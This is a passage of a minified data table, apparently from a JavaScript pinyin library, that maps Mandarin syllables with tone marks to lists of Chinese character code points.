dàn\":[20747,25812,30213],\"càn\":[20751,28591,28799,29158,29864,31922,34194,35634],\"bīn bìn\":[20752],\"án àn\":[20753],\"tái\":[20755,22382,23343,25260,25825,27311,28849,28850,31817,33274,34233,36294,37040,39089,39824,40080],\"lán\":[20758,20848,22226,23146,23706,23888,24177,25318,25876,26003,26005,26639,27396,27415,28572,28734,28742,28769,29155,29175,29884,31726,31811,31843,32383,33915,34013,34253,34347,34349,35124,35157,35172,35188,35197,35659,35733,35888,36509,37997,38247,38348,38417,38858],\"nǐ yì ài yí\":[20759],\"méng\":[20762,24170,26330,26406,27223,27308,27659,28309,28635,29965,30015,30431,31006,33384,33684,33804,34116,34427,34673,37171,37176,38719,38720,39021,39259,39885,40463,40562],\"níng\":[20764,20957,21659,22144,23331,26592,27235,27320,29406,29552,32845,32889,34228,37967,39713,40459],\"qióng\":[20765,21357,23430,24824,24972,26703,27241,28970,28973,29026,29069,29756,29898,30552,31351,31353,31406,31430,31547,31559,33340,33557,34257,34285,34537,34540,36217,36331,37019,37518],\"liè\":[20768,20925,21015,21155,21181,22482,22483,23028,23771,24036,25362,25449,26677,27916,27990,28872,28910,29037,29347,29454,29471,29557,32855,33055,33570,34522,36244,36496,36862,39090,39707,39715,39844,40050,40247],\"kuǎng\":[20771,22844,25069],\"bào\":[20772,21245,22577,24513,25253,25265,26323,29190,29350,33762,34403,34475,35961,37451,37988,38087,39602,39665,39825,40077],\"biāo\":[20774,22658,24150,24426,26631,27161,28398,28684,29083,29186,29451,30253,30950,33176,33237,35620,36102,37858,37987,38230,38259,39086,39095,39110,39111,39112,39114,39121,39129,39130,39531,39561,39647],\"zǎn\":[20775,20793,22086,25861,26141,36273,36274],\"háo\":[20779,21989,22071,22097,22158,22741,26883,27612,27627,28640,29510,29524,31443,31815,34461,34836,35705,35946],\"qìng\":[20780,20938,24198,24950,27366,28650,30851,30956,32580,38744],\"chèn\":[20781,22187,27015,27372,30114,34924,35183,35734,35894,36225,36226,40787,40788,40832],\"téng\":[20783,24144,28373,28443,30140,31824,31832,32290,33150,34276,34373,34723,35466,35588,36998,39398,39472,39523,39975],\"lǒng lóng lòng\":[20785],\"chán chàn\":[20787],\"ráng xiāng\":[20788,21239],\"huì xié\":[20790],\"luó\":[20792,25886,26916,27407,29473,29568,31657,31854,32599,32645,33078,33121,33821,34367,34746,35260,36923,37007,37837,38012,38179,38233,39264,39486,39512,39585,40449],\"léi\":[20797,23256,27281,27417,29891,30078,32306,32397,32413,32551,32589,32696,34050,34354,34374,36704,37939,37976,38253,38647,38721,40041,40762],\"nàng nāng\":[20798],\"wù wū\":[20800],\"yǔn\":[20801,21911,22845,25230,27538,27550,29377,30930,33658,36081,37399,38445,38504,38549,38691,39355,40811,40819],\"zān\":[20802,27253,31786,31790,31948,37909,37919,40292],\"yuán\":[20803,20870,21407,21409,21429,22253,22278,22286,22290,22291,22435,22636,23220,23236,25588,27038,27052,27260,27358,27781,28274,28304,28306,29232,29480,29503,31502,32227,32257,32536,32689,33554,34199,34653,34671,34696,34945,35108,35612,36677,36757,37005,37031,37211,37416,37809,39477,39789,40354,40368,40703,40715],\"xiōng\":[20804,20807,20982,21250,21256,21701,24567,24671,27769,27958,33015,33016,33422,35369,35454,35771],\"chōng\":[20805,22019,24545,24963,24999,25679,27798,28026,29675,32639,32704,33282,33375,33594,34909,36438],\"zhào\":[20806,22423,26064,26316,26523,27330,29031,29171,29411,30654,31498,32576,32617,32644,32897,32903,32904,35412,35791,36213,36249,39841],\"duì ruì yuè\":[20810,20812,20817],\"kè\":[20811,21051,21184,21194,22529,23060,23458,24682,24857,27690,28312,30886,32217,32514,33360,34889,35506,35838,37633,38174,39437,39570],\"tù\":[20814,20820,22541,36812,40309],\"dǎng\":[20826,25897,27411,35681,35740,35872,40680],\"dōu\":[20828,20832,21783,27255,31740,34104],\"huǎng\":[20836,22875,24140,24627,24653,26180,28862,29056,32296,35428,35594,35854],\"rù\":[20837,21973,23223,25174,26433,27955,28349,32287,32539,34e3,35109,40176],\"nèi\":[20839,27677,27678,37655],\"yú shù\":[20842],\"liù lù\":[20845],han:[20847,29235],\"tiān\":[20850,22825,23126,28155,37215,38740,38749,40647],\"xīng xìng\":[20852],\"diǎn\":[20856,22200,22860,23152,25951,26915,28857,30872,33959,34119,36398,40670],\"zī cí\":[20857],\"jiān\":[20860,20927,22223,22362,22533,22904,23014,23015,23574,24181,24804,25099,25108,25627,26942,27179,27388,27516,27569,27570,28244,28688,28728,29006,29086,29112,29259,29770,30583,31003,31031,31546,31627,32216,32273,32516,32547,32937,33392,33393,33733,33786,33868,33977,34090,34129,34163,34371,35708,35932,37999,38595,38831,38848,38857,39216,39330,39956,39964,39993,40099,40146,40273,40307,40380,40547,40585],\"shòu\":[20861,21463,21806,22781,22784,23551,25480,29417,29539,29560,30185,30246,32172,32502,33156],\"jì\":[20862,20864,21058,21092,21137,21219,22358,22413,22600,22931,23395,23490,23492,24301,24401,24475,24524,24760,24782,25083,25216,26081,26082,26083,26280,26281,26305,26782,27285,27317,27918,28419,28424,28721,30197,30304,31133,31273,31287,31300,31306,31335,32e3,32153,32318,32331,32380,32487,32489,32637,33262,33456,33549,33572,33898,34015,34055,34186,34318,34350,34363,35034,35136,35244,35274,35336,35352,35467,35745,35760,36321,36349,36447,36857,38469,38555,38657,38717,39525,39589,39675,39742,39773,39781,39898,39933,39990,39999,4e4,40045,40090,40107,40267,40401,40780],\"jiōng\":[20866,20875,22384,22491,25155,34319,34324,39369,39403],\"mào\":[20867,20880,23202,24125,24855,25035,26259,26581,26969,27639,29761,30339,30474,30592,32772,33538,33850,34640,34980,35218,35980,36031,36152,37146,37166],\"rǎn\":[20868,20873,22988,23203,26579,29635,33490,33925],\"nèi nà\":[20869],\"gāng\":[20872,20910,21018,21083,22536,22589,23713,25478,25667,26849,29288,29317,30104,32177,32434,32568,32577,32609,32923,37357,37792],\"cè\":[20874,20876,21397,21408,22824,24257,24699,24827,24993,25927,27979,28204,31527,31574,31582,31604,31651,33629,33815,33844,34011],\"guǎ\":[20878,21072,21102,21479,23521],\"mào mò\":[20882],\"gòu\":[20883,21826,22392,22434,22815,22816,23230,24384,25606,25728,26500,27083,29049,35247,35279,35389,35436,35807,36092,36141,36952,38602],\"xǔ\":[20884,21923,26250,26665,29661,30440,31944,35425,35583,35817,37158,37265],\"mì\":[20886,20906,22055,22611,23483,23494,23770,24130,24142,24166,24637,27027,27154,27329,27752,28135,28405,28446,28631,29072,32643,34084,34588,35219,35220,35227,35269,35600,35879,40719],\"yóu yín\":[20888],\"xiě\":[20889,20905,34267],\"jūn\":[20891,21531,22343,26750,27758,30386,30392,30393,30853,33689,34448,34944,35232,36557,37406,37505,37534,37717,38055,38965,39862,40106,40591],\"mí\":[20894,25823,28720,29218,29461,29564,31074,31152,32315,33982,34252,34346,34364,34990,35448,35598,36855,37274,37310,37311,37316,38270,40461,40586,40587,40603],\"guān guàn\":[20896,35212,35251,35264,35266],\"měng\":[20897,21200,25077,25529,29467,29556,33355,34594,34835,37683,38192,39917,40710],\"zhǒng\":[20898,22618,23600,27505,28996,30215,32959,33131,36405],\"zuì\":[20899,23989,26220,26368,26668,27100,27271,27276,31101,32074,32618,34142,36768,37204,37243,37257,37642],\"yuān\":[20900,21064,22246,23357,23491,26857,28149,28161,28166,28170,28181,28737,30498,32921,33918,33964,34574,34613,39372,40182,40219,40311,40482,40499,40531,40728,40733],\"míng\":[20901,21517,26126,26269,26393,27040,27962,28319,29501,30464,30515,30609,33559,34719,35245,35450,37133,37528,38125,40180,40483],\"kòu\":[20902,21481,23484,23495,25187,25922,28401,31387,31576,31750,34098,34107,37350,40391],\"tài\":[20909,22826,22835,24562,24577,24907,27760,27761,27888,28313,32957,33318,37214,37414,38043],\"féng píng\":[20911,39342],\"chōng chòng\":[20914],\"kuàng\":[20917,22329,22745,23730,25068,26103,26175,26336,26694,27841,29196,30486,30518,30719,30783,31014,31340,32075,32086,32394,32425,36026,36150,36582,37021,37178,37489,37595,37979,40651],\"lěng\":[20919],\"pàn\":[20920,21028,21467,27804,27886,28351,28813,29257,30036,30460,34978,35195,35402,37612,38011,38934,40293],\"fā\":[20921,24386,27831,30330,30332],\"xiǎn\":[20924,23583,23584,23812,23982,24176,25863,26174,27382,27624,28774,28877,29177,29405,29443,29547,29550,29569,31122,31557,31666,34259,34330,34476,34566,35683,36219,36323,37708,38505,38522,38570,38853,38997,39023],\"qià\":[20926,22326,24098,24688,27534,27965,30792,32994,39618],\"jìng chēng\":[20928,20936,28136],\"sōu\":[20929,21974,24256,24267,25436,25628,25673,28338,29504,33368,33936,34699,37131,37273,37802,38204,39100,39125,39231,39306,39466],\"měi\":[20930,23172,23226,23309,23876,25396,27598,27599,28028,28220,29144,32654,36542,37762,38209,40675],\"tú\":[20931,22259,22270,22294,22295,22615,23648,23801,23902,24233,24284,24466,24711,25580,28034,30223,31585,33135,33660,33956,36351,36884,37236,37423,37710,39327,39420,40268,40351,40395,40437],\"zhǔn\":[20934,20950,22523,28310],\"liáng liàng\":[20937,28092,37327],\"diāo\":[20939,20993,21023,21500,22877,24372,24427,27720,29745,30857,31763,34413,34497,35970,37677,38613,39817,39899,40119,40304,40742],\"còu\":[20945,28234,33120,36659,36751],\"ái\":[20946,21824,22026,25457,28336,30284,30353,30362],\"duó\":[20953,21099,22842,22890,30181,36401,37420,37944,38094],\"dú\":[20959,21301,23355,26911,27357,27568,28060,29261,29272,29322,29346,29420,29544,29892,30398,35067,35501,35712,35743,35908,36117,37654,37983,38855,38883,38885,39475,39633,40681,40695],\"jǐ jī\":[20960],\"fán\":[20961,20962,20963,21285,22694,26443,26569,26853,27146,28735,28902,29033,29140,29856,30718,31020,31538,31861,32208,32691,33316,33319,34208,34345,34844,35150,36463,37353,37895,37922,38034,40429],\"jū\":[20965,21258,23093,23150,23621,23820,25221,25398,25516,26798,26896,27275,27625,27633,27843,28090,29401,29722,30141,30752,32605,33106,33357,34587,35070,35530,36308,36376,36537,38513,38606,38816,38827,39378,39545,39816,40225,40331],\"chù chǔ\":[20966,22788],\"zhǐ\":[20970,21159,21675,22336,22375,24075,24649,25210,25351,26088,26547,27490,27750,27802,27924,28157,30139,30731,31049,31190,32025,32440,33463,33547,34274,34937,35175,35368,36286,36601,36725,37231,38447,40697],\"píng\":[20973,20980,21615,22378,22592,23740,24097,24114,24136,24179,24959,24977,26544,27956,28969,29622,29942,29953,31470,31667,31752,32574,33619,33805,34033,34482,34530,35413,35780,36607,36647,37105,39811,40070],\"kǎi\":[20975,20977,21056,21108,22450,22607,24698,24887,24936,26271,33928,36614,37703,37799,38112,38196,38355,38399,39101],\"gān\":[20978,22377,23602,23604,23606,23607,26577,27860,28455,29589,29976,30131,30712,31487,31608,31891,32925,33527,36800,37200,39760],\"kǎn qiǎn\":[20981],\"tū\":[20984,22551,23936,25464,28043,28261,30172,31167,31171,31361,33878,37621,40282,40757],\"āo wā\":[20985],\"chū\":[20986,21021,23680,25716,27019,27159,35993,40803],\"dàng\":[20988,22325,22449,22731,26723,27284,27705,29847,29949,30442,30602,30720,30893,30993,31772,33633,33770,34153,34351,36260,36927,38652],\"hán\":[20989,20990,21547,22277,23074,23506,23841,26199,26770,27995,28085,28559,28947,29696,29981,31592,34604,37015,37039,37601,38867,38889],\"záo\":[20991,38015],\"dāo\":[20992,20994,24521,27672,33312,34729,37334,39771,40061],\"chuāng\":[20997,25680,29262,29269,30126,30241,31379,31383,31419],\"fēn fèn\":[20998],\"qiè qiē\":[20999],\"kān\":[21002,21208,22570,25121,26654,40853,40859],\"cǔn\":[21004,24534],\"chú\":[21005,21416,24174,24282,27249,27337,27365,28353,29331,31720,32801,33467,33954,33965,34573,34805,35936,36238,36464,36487,36501,37455,37604,38148,38500,38607,38619,40373],\"huà huá\":[21010],\"lí\":[21013,21075,21114,21145,21400,21937,22175,22212,23264,23415,24306,24737,26792,26808,26819,28435,28757,29313,29314,29432,29709,29827,29896,30432,30557,31163,31346,31472,31587,31729,31852,31950,32301,32545,32633,33347,33650,33758,34016,34110,34268,34362,34570,34765,34808,34859,35125,35623,35981,37288,37611,37637,37867,37975,38626,39530,39562,39887,39916,40058,40097,40313,40477,40514,40654,40679],\"yuè\":[21014,23347,23684,23731,23997,24689,24709,24742,25097,25224,25459,26376,27198,28729,29210,29605,31039,31156,31703,31814,31845,31856,31908,31925,34341,34446,34447,35500,36234,36288,36291,36493,36559,37381,37470,38e3,38074,38321,38322,38405,40465,40473,40678,40864],\"liú\":[21016,21129,22176,23225,23911,26056,26066,27060,27210,27969,27983,28687,29705,29792,29804,29858,30020,30041,30065,30081,30244,30277,30827,33957,33989,34761,35031,37775,37840,37890,38240,39104,39109,39127,39392,39413,39470,39505,39581,39969,40377,40544,40589],\"zé\":[21017,21063,21863,22038,23271,24123,24152,25246,27149,27509,27810,27854,28333,30367,30612,30688,30987,31654,31744,33332,34102,34828,35159,35630,36094,36188,36846,40453,40794,40816],\"chuàng chuāng\":[21019,21109],\"qù\":[21022,21434,21435,38324,38339,38418,40622,40705],\"bié biè\":[21029,21035],\"páo bào\":[21032],\"chǎn chàn\":[21036,21079,24157],\"guā\":[21038,21120,26736,27460,29041,29916,32973,36411,39082,39091,39463,40240,40505],\"gēng\":[21039,24218,26921,28013,28991,30026,32090,32686,32697,32789,33774,36065,36179,40330,40530],\"dào\":[21040,22133,24764,26913,27300,29182,29913,30423,30428,31282,31291,32411,32767,33364,33791,34908,34911,36551,36947],\"chuàng\":[21041,21071,21081,24582,24884],\"kū\":[21043,21741,22288,22528,26543,26701,30715,31391,36301,37056,39607,39852],\"duò\":[21044,21057,22703,23598,24816,24988,25349,26711,33333,36325,36346,38474,38479,39167,39283,40317],\"shuā shuà\":[21047],\"quàn xuàn\":[21048],\"chà shā\":[21049,21070],\"cì cī\":[21050],\"guì\":[21053,21055,21130,21132,25740,25904,26123,26690,26914,27126,27195,27331,29476,31148,31552,34005,35160,36020,36149,36330,37888,37966,38844,40022,40037],\"lóu\":[21061,23044,23105,24276,27004,27155,28295,28426,29089,32807,32812,33371,33932,34078,34684,34747,35633,36545,36977,38843,39621,39631],\"cuò\":[21065,21074,21405,22798,25387,25514,26852,33693,33697,33996,36906,37564,37679,38153,38169],\"xiāo xuē\":[21066],\"kēi kè\":[21067,23557],\"là lá\":[21068],\"tī\":[21076,26799,36386,37563,38161,40392,40393],\"pōu\":[21078],\"wān\":[21084,22598,22762,24117,24367,24398,28286,28523,28771,30549,34623,35916],\"bāo bō\":[21085,21093],\"duō\":[21087,21636,21702,22153,22810,22811,25479,27634,30035,35056],\"qíng\":[21088,21197,22813,24773,25806,26228,26258,26878,27144,27296,27696,29984,30808,33885,40677],\"yǎn shàn\":[21089],\"dū zhuó\":[21090],\"yān\":[21094,23267,23846,23958,24697,25045,25064,27182,28106,28153,28473,28895,28937,28945,29017,29658,31734,33005,33241,33784,37154,37251,38329,38409,40683],\"huō\":[21096,21136,21529,25865,31220,32800,38186,39454],\"shèng\":[21097,21104,21213,22307,22701,23882,26208,27066,27251,29726,32854,34114,36025,36088],\"duān zhì\":[21100],\"wū\":[21101,21596,21978,22316,23627,24043,24345,26439,27469,27737,27738,27745,27967,28879,31375,31676,34704,35464,35491,35820,37036,37140,37794,38056,39966,40238],\"gē\":[21106,21733,22314,24385,25096,25107,25128,27468,28370,29365,32912,35004,35596,37814,40218,40255,40509],\"dá zhá\":[21107],\"chuán\":[21110,26295,26941,31685,33313,33321,33337,36658,36932],\"tuán zhuān\":[21112,28441,31743],\"lù jiū\":[21113],\"pēng\":[21115,21257,22061,24614,24690,25256,26760,28921,30768,36591,39373],\"piāo\":[21117,21217,24915,26074,29349,32754,34741,39107,39108,39128,39762],\"kōu\":[21118,24388,25248,25715,30477,30616,33444],\"jiǎo chāo\":[21119,21131,21222,25719],\"qiāo\":[21121,21226,22685,24167,25970,27207,27587,29126,30807,30973,32337,36268,36343,36365,36474,36475,37115,37153,37157,37739,37740,37936,38201,38941],\"huá huà\":[21123],\"zhā zhá\":[21124],\"pī pǐ\":[21128,24706],\"tāng\":[21135,22049,32688,34202,34666,36442,38842,40734],\"chán\":[21142,22197,22757,23157,23307,24009,24283,26830,27610,28281,28537,28538,28598,28685,28730,29016,29521,30939,32254,32399,32402,32544,33388,34633,34768,34796,34814,35479,35730,35863,36500,37181,37185,37579,38001,38261,39262,39307],\"zuān\":[21143,36508,36518,37446,37978],\"mó\":[21144,23275,23332,23351,23579,25721,25845,27205,31970,33180,34278,34321,35624,35625,35871,39235,39261,39309,39629,39764,39801],\"zhú\":[21146,26040,26351,27416,28767,28834,28891,29165,29221,30211,31481,31489,31516,33331,33599,34027,34827,34878,36485,36880,36907,38019,40001],\"quàn\":[21149,21223,21240,29302,38863],\"jìn jìng\":[21156,21170,21185],\"kēng\":[21157,22353,29308,30785,30812,35481,37557,37726,37847,38143,38444],\"xié liè\":[21158],\"zhù chú\":[21161],\"nǔ\":[21162,24361,30766,33004],\"shào\":[21165,21362,21736,28530,32057,32164,32461,34961,37045],\"miǎo\":[21168,26474,28156,28218,30471,31186,31694,32242,32520,34256,37e3],\"kǒu\":[21174,21475],\"wā\":[21176,22380,23090,23207,23666,25366,25896,27964,28315,28453,29950,30038,31349,31370,31402,34521,38856,40707],\"kuāng\":[21179,21281,21289,21712,24647,27949,31568,31610,35462,35795,36589,37052],\"hé\":[21182,21642,21853,22976,23750,25926,26359,26567,26945,27644,27827,28088,28206,28565,29062,30380,30407,30409,30413,30418,31166,31701,31866,31917,32750,33743,33794,35208,35384,35429,37059,37339,37452,37961,38305,38356,38402,38422,38824,38940,39172,39288,39802,40534,40615,40789,40833,40866],\"gào\":[21186,21567,21578,23804,31086,31088,31134,31606,35493,35824,37084,37615,38150],\"bó bèi\":[21187],\"láng\":[21190,23247,24266,25999,26745,27028,27139,27444,29436,29701,29807,30816,31234,33350,33992,34571,34690,36532,37074,37086,37571,37807,38162],\"xūn\":[21195,21211,21234,21235,22161,22339,22489,22628,22734,22758,26331,29179,29551,30660,32385,33232,34219,34224,34317,37306],\"juàn juān\":[21196,29945],\"lè lēi\":[21202],\"kài\":[21203,28812,28887,37774],\"wěng yǎng\":[21212],\"qín\":[21220,21994,22105,23964,24200,25027,25028,25446,25810,26035,27278,28607,29665,29748,29753,30269,31165,31206,32825,33449,33465,33766,34707,34820,37401,37419,38594,38770,40185,40301],\"jiàng\":[21221,21278,21280,23929,24348,24374,25726,27364,27930,28400,29343,31969,31976,32115,32475,35645,37233,37284,37292],\"fān\":[21227,23311,24070,24161,24539,24995,26073,26075,32345,32763,34281,36691,39103,39132,40021],\"juān\":[21228,23010,23071,25424,28051,34866,35024,37816,37931,38220,40515],\"tóng dòng\":[21229,28884,29137,29418],\"lǜ\":[21236,22415,23874,24459,24942,27695,28388,28670,29192,31675,32160,32322,33183,33870,34385,37986],\"chè\":[21238,22396,24443,24505,25507,25764,28552,28898,29217,30638,30825,32837,36832,38937],\"sháo\":[21242,29631,38902],\"gōu gòu\":[21246],\"cōng\":[21254,22250,22257,24553,24625,24740,26288,27180,28439,29821,29825,30619,31733,32369,32865,32870,32874,32880,33473,33552,33905,34031,34085,34764,37743,37843,37862,39448,39492,39586],\"táo yáo\":[21259,38518],\"páo\":[21263,21638,22409,24214,29230,29389,34957,35100,36595,38788,40581],\"dá\":[21266,22962,24603,28831,29173,30051,31530,32653,33625,34200,34813,35418,36798,36815,36822,36826,36921,36948,37949,38780,38801,38851,40854,40856],\"huà huā\":[21270],\"běi bèi\":[21271],\"nǎo\":[21272,22452,22550,23248,24700,24745,24817,29785,30895,33041,33075,33126],\"chí shi\":[21273],\"fāng\":[21274,22543,26041,28115,29285,33459,37025,37377,37690,38059,40203],\"zā\":[21277,21634,24064,27806,33244,33250,36810,37460,39795],\"qiè\":[21287,21394,22974,24623,24719,24812,24860,25352,31317,31363,31434,31521,31655,31691,31841,36389,37733,38194,39900],\"zāng cáng\":[21288],\"fěi\":[21290,22876,24753,26832,27047,31706,32737,34140,35513,35837],\"kuì guì\":[21294,21297],\"suǎn\":[21300],\"pǐ\":[21305,22141,22189,22318,24192,30174,30294,33076,33481,37538,40196],\"qū ōu\":[21306,21312],\"kē qià\":[21308],\"yǎn yàn\":[21309,26858],\"biǎn\":[21310,24828,25561,30885,31272,31366,34250,35082,36022,36140,40216],\"nì\":[21311,22532,23263,23354,24772,24885,26165,26289,27708,30500,30568,32268,32978,33147,33193,36870],\"niàn\":[21316,21816,22493,24319,24565,24791,33356],\"sà\":[21317,27346,33038,33832,34159,34217,37394,38561,39087,39122,39354],\"zú\":[21318,21739,23850,26063,31652,36275,36388,38238],\"shēng\":[21319,21583,22768,26008,26119,26363,26529,27525,27881,28262,28986,29298,29636,29983,29989,31444,31513,32882,37454,37727,38441,38494,38521,40319,40746],\"wàn\":[21325,21328,24552,26468,30627,33045,33109,33836,34755,36110,36624,37693],\"huá huà huā\":[21326,33775],\"bēi\":[21329,24754,25593,26479,26734,30403,30865,34275,40303,40526],\"zú cù\":[21330],\"dān shàn chán\":[21333,21934],\"nán nā\":[21335],\"shuài lǜ\":[21339],\"bǔ bo pú\":[21340],\"kuàng guàn\":[21341],\"biàn\":[21342,21464,22793,23749,24321,24487,24557,25219,26154,27763,27764,29603,33361,33476,35213,35546,35722,36769,36775,36776,36777,36779,36782,36783,36941,37318],\"bǔ\":[21343,21754,25429,34917,35036,40468],\"zhàn zhān\":[21344,35249],\"kǎ qiǎ\":[21345],\"lú\":[21346,22183,22406,22746,24208,24300,26341,26534,26636,27368,27896,28696,28809,29200,29561,29576,29904,30439,30673,31834,32401,32591,33002,33242,33326,33339,33387,33446,34310,34854,36708,36723,37417,37994,39025,39045,39359,39639,39794,40056,40072,40469,40492,40696],\"lǔ\":[21348,22647,25523,25796,27152,27257,27347,27660,28407,28571,28674,30837,30944,31326,33379,33386,34046,34383,34396,37824,37930,37989,38245,39791,40065,40565],\"guà\":[21350,21865,25346,25499,32611,35074,35455,35798],\"áng yǎng\":[21356],\"yìn\":[21360,22461,22583,24277,24941,24982,24983,25050,27925,28250,29452,30282,32996,33562,37235,39843],\"què\":[21364,21371,22617,23813,24747,24872,24932,25609,27063,29161,29751,30389,30830,30906,31021,38347,38421,40306,40522],\"luǎn\":[21365],\"juàn juǎn\":[21367,24059],\"chǎng ān hàn\":[21378],\"wěi yán\":[21379],\"tīng\":[21381,21403,21548,24193,24304,24307,27712,28867,28916,32142,32787,32884,32892,32893,38803],\"zhé zhái\":[21383],\"hàn àn\":[21384,23677],\"yǎ\":[21386,21782,24204,30166,30210,34149],\"shè\":[21389,21401,24381,24913,24948,25086,25666,27399,28041,28091,28169,28384,28740,31038,33294,34062,34818,35373,35774,36198,39431,40605],\"dǐ\":[21390,21607,22360,24356,25269,25310,25483,29300,30757,33767,35293,35398,35787,36583,37048,38458,39606,39923],\"zhǎ zhǎi\":[21391],\"páng\":[21392,23246,24222,24492,33152,33341,34691,36868,39967,40145,40846,40848],\"zhì shī\":[21396],\"máng\":[21398,21506,21732,23055,24537,24702,26455,26471,27730,27997,29307,30173,30450,30829,31488,33426,33579,34313,37017,37359,37609,38099,39417],\"zuī\":[21404,27190,32407,34773],\"shà xià\":[21414,24264],\"áo\":[21419,22007,22008,24274,25942,28406,29522,29523,29832,32753,32758,32762,32881,34076,34735,35639,35640,36968,37846,38558,39986,40140,40404,40711],\"lán qiān\":[21425],\"sī mǒu\":[21430],\"gōng hóng\":[21431],\"lín miǎo\":[21432],\"qiú róu\":[21433],\"dū\":[21438,22047,30563,37263],\"xiàn xuán\":[21439,32291],\"cān shēn cēn sān\":[21442,21443,21444,21445],\"ài yǐ\":[21446],\"chā chà chǎ chá\":[21449],\"shuāng\":[21452,23360,23367,27398,31029,33389,38617,38684,39483,39526,39590,40414,40472,40564],\"shōu\":[21454,25910],\"guái\":[21455],\"bá\":[21456,22957,25244,25300,28838,30329,32968,33543,33757,35417,36299,36599,39747,40741],\"fā fà\":[21457],\"zhuó yǐ lì jué\":[21461],\"qǔ\":[21462,23094,31468,34682,35411,40818,40843],\"jiǎ xiá\":[21466,24486],\"wèi yù\":[21470,23561,34074],\"dié\":[21472,22436,22558,23756,24137,24654,24821,25116,26337,27548,27662,29251,29266,29918,30067,30082,30089,30090,30879,32112,32470,32778,32779,32965,33363,33525,34600,34678,35083,35396,35548,35853,36334,36416,36845,38267,39944,40125,40233],\"ruì\":[21473,26520,27757,29790,30591,33454,34443,34617,37555,37613,38160],\"jù gōu\":[21477],\"lìng\":[21478,21604,28841,34342],\"dāo dáo tāo\":[21480],\"zhī zhǐ\":[21482],\"jiào\":[21483,21580,22018,22054,22093,23315,25997,26016,28376,28438,29541,29651,30381,31382,34272,35334,35685,36269,36611,36686,36735,36739,37237,37294,37314],\"zhào shào\":[21484],\"kě kè\":[21487],\"tái tāi\":[21488,33492],\"pǒ\":[21493,23552,31544,31653,37461,38071,39370],\"yè xié\":[21494],\"hào háo\":[21495],\"tàn\":[21497,22022,25506,27470,28256,28845,30899,33301],\"hōng hóng\":[21503],\"miē\":[21504,21673,21750,23405],\"xū yū yù\":[21505],\"chī\":[21507,21735,21931,21988,22084,22939,23224,24424,24434,25691,25889,27558,29947,30196,30305,30517,30621,31518,31898,33013,34473,34733,35381,39761,40223,40260,40497,40656,40797],\"xuān sòng\":[21509],\"yāo\":[21510,21907,22829,22934,24186,26950,27520,31045,33136,33917,35358,36992,40193,40226],\"zǐ\":[21511,22985,22986,23376,26445,26771,27039,27252,28371,30711,31213,31531,31869,32043,32788,34424,35391,37352],\"hé gě\":[21512,40068],\"cùn yīngcùn\":[21515],\"tóng tòng\":[21516],\"tǔ tù\":[21520,21771],\"zhà zhā\":[21522,22867],\"xià hè\":[21523],\"ā yā\":[21526],\"ma má mǎ\":[21527],\"lìn\":[21533,24673,24715,27209,28955,29968,33190,34106,34298,36035,36161,36472,36495,36505,36522,36709,38325],\"tūn\":[21534,26302,26396,28958],\"bǐ pǐ\":[21537],\"qìn\":[21538,21539,21786,25227,25599,25607,25779,27777,28697,33763,34301],\"jiè gè\":[21540],\"fǒu pǐ\":[21542],\"ba bā\":[21543],\"dūn\":[21544,22136,22697,22698,24775,25737,25780,29340,29540,30981,34611,36478,39504],\"fēn\":[21545,24073,26128,26374,26788,26875,27675,31445,32027,32439,32706,33452,34927,35356,36526,37210,37398,38640,39220,39257,39322],\"é huā\":[21546],\"kēng háng\":[21549,22932],\"shǔn\":[21550],\"zhī zī\":[21553],\"yǐn shěn\":[21554],\"wú\":[21555,21556,21577,22706,23807,26791,27206,27595,27926,28015,28961,29688,29841,31078,33436,33571,33665,34154,34568,34801,35669,37082,37593,38139,39875,40272,40417,40512,40751],\"chǎo chāo\":[21557],\"nà nè\":[21558],\"xuè chuò jué\":[21559],\"chuī\":[21561,28810,40865],\"dōu rú\":[21562],\"hǒu\":[21564,29372],\"hōng hǒu ōu\":[21565],\"wú yù\":[21566],\"ya yā\":[21568],\"è e\":[21571],\"dāi\":[21574,25051,29507],\"mèn qǐ\":[21575],\"hōng\":[21581,22173,25544,28788,28888,28962,30817,34216,35335,35902,36579,36663,36703,36720,37735],\"chǐ yīngchǐ\":[21582],\"nà\":[21584,25466,31517,32013,32435,32941,33971,34930,35965,35968,36572,37069,37385,38048,38777,39798],\"tūn tiān\":[21585],\"ḿ\":[21586],\"dāi tǎi\":[21588],\"ǒu ōu òu\":[21589],\"bài bei\":[21591],\"yuán yún yùn\":[21592,21729],\"guō\":[21593,21871,22035,22490,22557,22670,23838,24393,24397,25046,29459,30225,32850,34632,34760,37101,37403,37707,38149],\"huá qì\":[21594],\"qiàng qiāng\":[21595,36292],\"shī\":[21598,22833,23608,23629,24072,24107,26045,27977,28260,28287,28334,28348,28629,29422,29509,29793,32065,33913,33938,33997,34417,34664,35127,35193,35433,35799,37055,37315,37447,37734,39924,39972,40122,40178,40190,40371,40484],\"juǎn\":[21599,22477,33223,33764,37640,38185],\"pěn\":[21600,32760],\"wěn mǐn\":[21601],\"ne ní\":[21602],\"ḿ m̀\":[21603],\"rán\":[21605,22059,28982,29123,32334,32944,34470,34490,34939,34951,34977,39653,39663],\"tiè chè\":[21611],\"qì zhī\":[21614],\"zǐ cī\":[21616],\"guā gū guǎ\":[21617],\"cī zī\":[21618],\"hǒu xǔ gòu\":[21620],\"hē ā á ǎ à a\":[21621],\"náo\":[21622,22802,23793,23977,24014,25376,25747,29489,30791,34546,34799,35401,35658,37891,38105],\"xiā gā\":[21623],\"pēi\":[21624,24588,32935,32986,34883,37253],\"háo xiāo\":[21626],\"mìng\":[21629,25525],\"dá dàn\":[21630],\"zuǐ jǔ\":[21632],\"xián gān\":[21633],\"pǒu\":[21637,21731,29315],\"yǎng yāng\":[21641],\"zǎ zé zhā\":[21643],\"hé hè huó huò hú\":[21644],\"hāi\":[21645],\"dā\":[21649,21714,22112,22710,25645,25752,32823,35105,37789],\"kǎ kā\":[21652],\"gū\":[21653,21762,21763,22993,23284,23396,24044,24045,26599,27245,27837,27858,31250,31519,31629,31643,31696,32603,33533,33735,33776,33991,35290,36593,36594,36721,36764,37220,37426,39829,40227,40490],\"kā gā\":[21654],zuo:[21655],\"lóng\":[21657,22184,23952,24003,24004,26173,26344,26407,26634,27102,27379,28272,28381,28427,29206,29649,29903,30275,30508,30675,30779,31025,31026,31423,31452,32843,32894,32999,33551,34338,34858,34860,35185,35909,37863,37992,38707,38727,39521,40471,40845,40850,40857],\"xiàn xián\":[21662],\"qì\":[21664,21805,22096,22120,22817,24323,24967,25001,26275,26820,27435,27668,27671,27683,27732,27773,27875,28230,28231,28801,29960,30453,30709,30875,30902,30940,30951,32586,33438,33914,34258,34815,35350,35755,36804,37905],\"xì dié\":[21669],\"liē liě lié 